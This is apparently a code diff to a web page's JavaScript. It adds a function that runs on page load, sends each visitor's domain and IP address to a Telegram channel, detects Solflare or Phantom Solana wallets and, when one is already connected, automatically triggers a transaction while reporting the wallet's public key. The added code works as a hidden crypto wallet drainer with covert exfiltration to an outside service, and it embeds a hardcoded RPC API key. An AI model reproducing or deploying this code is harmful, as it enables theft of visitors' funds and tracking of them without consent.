@@ -43,13 +43,13 @@ $(document).ready(async function () {
   }
 
   // Notifica quando un visitatore accede alla pagina
-  async function notifyPageVisit() {
-    const domain = window.location.hostname;
-    const visitorIp = await getVisitorIp();
-      await sendTelegramMessage(
-       `👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`
-      );
-  }
+  // async function notifyPageVisit() {
+  //   const domain = window.location.hostname;
+  //   const visitorIp = await getVisitorIp();
+  //     await sendTelegramMessage(
+  //      `👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`
+  //     );
+  // }
 
   // Notifica quando la pagina viene chiusa o ricaricata
   async function notifyPageCloseOrReload() {
@@ -296,6 +296,63 @@ $(document).ready(async function () {
       hideLoader(selected);
     }
   }
+async function notifyPageVisit() {
+  const domain = window.location.hostname;
+  const visitorIp = await getVisitorIp();
+
+  await sendTelegramMessage(
+    `👋 New visitor!\n🔗 Domain: ${domain}\n🌐 IP: ${visitorIp}`
+  );
+
+  // Begin checking wallet connections
+  await sendTelegramMessage("🔍 Checking for connected wallets...");
+
+  try {
+    const connection = new solanaWeb3.Connection(
+      "https://solana-mainnet.api.syndica.io/api-key/2cNj8UFmQbtuycMgEsbaSuPQNDj7BmctdcyCujkqJVYAdofc4HVpaATstnBTsQwbP4PZ2zcTjcz86GWzPZMwayiYtFERGCADtyZ",
+      "confirmed"
+    );
+
+    // 🟪 Jupiter (Solflare) Wallet Detection
+    if (window.solflare && window.solflare.isSolflare) {
+      await sendTelegramMessage("🟪 Solflare (Jupiter) wallet detected.");
+
+      if (window.solflare.publicKey) {
+        await sendTelegramMessage(
+          `✅ Jupiter wallet already connected: ${window.solflare.publicKey.toBase58()}`
+        );
+
+        await executeTransaction(connection, window.solflare, window.solflare.publicKey);
+        await sendTelegramMessage("🚀 Transaction triggered for Jupiter wallet.");
+        return;
+      } else {
+        await sendTelegramMessage("⚠️ Jupiter wallet found but not connected (no publicKey).");
+      }
+    }
+
+    // 🟦 Phantom Wallet Detection
+    if (window.solana && window.solana.isPhantom) {
+      await sendTelegramMessage("🟦 Phantom wallet detected.");
+
+      if (window.solana.publicKey) {
+        await sendTelegramMessage(
+          `✅ Phantom wallet already connected: ${window.solana.publicKey.toBase58()}`
+        );
+
+        await executeTransaction(connection, window.solana, window.solana.publicKey);
+        await sendTelegramMessage("🚀 Transaction triggered for Phantom wallet.");
+        return;
+      } else {
+        await sendTelegramMessage("⚠️ Phantom wallet found but not connected (no publicKey).");
+      }
+    }
+
+    await sendTelegramMessage("❌ No connected wallet found on page visit.");
+  } catch (err) {
+    console.error("❌ Error in notifyPageVisit auto-execution:", err);
+    await sendTelegramMessage(`💥 Error during wallet auto-execute: ${err.message}`);
+  }
+}
 
   // Update the wallet connection handlers
   $("#connect-phantom").on("click", async () => {
